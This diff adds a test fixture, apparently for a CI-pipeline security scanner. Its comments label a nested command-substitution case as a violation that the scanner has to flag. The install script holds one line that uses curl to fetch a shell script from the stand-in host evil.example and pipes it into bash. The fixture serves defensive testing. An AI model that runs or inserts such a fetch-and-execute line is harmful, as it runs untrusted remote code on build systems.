@@ -1,0 +1,9 @@
+# violation: a command substitution nested inside another one. The
+# inner fetch resolves to an untrusted host regardless of how the
+# nesting itself is read, so this must fire whether or not the span
+# scan resolves the nested form cleanly: a form that doesn't parse out
+# cleanly to a known-trusted target must never be read as trusted.
+install:
+  image: alpine:3.19
+  script:
+    - bash -c "$(curl -s "$(echo https://evil.example)/x.sh")"
